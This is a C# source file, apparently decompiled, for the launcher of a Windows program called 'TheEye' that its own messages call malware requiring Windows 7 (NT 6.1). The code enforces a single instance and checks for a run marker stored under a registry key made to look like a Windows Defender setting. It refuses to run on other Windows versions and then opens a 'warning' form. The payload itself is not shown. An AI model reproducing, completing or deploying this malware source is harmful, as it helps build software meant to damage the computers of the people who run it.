using Microsoft.Win32;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Win32.TheEye
{
  internal static class Program
  {
    private static bool IsSingleInstance()
    {
      bool createdNew;
      Mutex mutex = new Mutex(true, "MY_UNIQUE_MUTEX_NAME", out createdNew);
      return createdNew;
    }

    [STAThread]
    private static void Main()
    {
      if (Program.IsSingleInstance())
      {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.ThreadException += new ThreadExceptionEventHandler(Program.ExceptionErr);
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Defender", true);
        if (subKey.GetValue("WarnEULA") != null && (int) subKey.GetValue("WarnEULA") == 1)
        {
          int num = (int) MessageBox.Show("You are trying to launch me a another time, I do not advise you to do that...", "TheEye (by DesConnet)", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
          Environment.Exit(1);
        }
        int major = Environment.OSVersion.Version.Major;
        int minor = Environment.OSVersion.Version.Minor;
        if (major != 6 || minor != 1)
        {
          int num = (int) MessageBox.Show(string.Format("You are running NT {0}.{1}\nThis malware required NT 6.1 to run properly", (object) major, (object) minor), "TheEye", MessageBoxButtons.OK, MessageBoxIcon.Hand);
          Environment.Exit(1);
        }
        Application.Run((Form) new warning());
      }
      else
      {
        int num1 = (int) MessageBox.Show("You're trying to launch a second copy of TheEye.", "TheEye (by DesConnet)", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      }
    }

    private static void ExceptionErr(object sender, ThreadExceptionEventArgs e)
    {
      int num = (int) MessageBox.Show("An error has occurred: " + e.Exception.ToString(), "TheEye (by DesConnet)", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Environment.Exit(1);
    }
  }
}
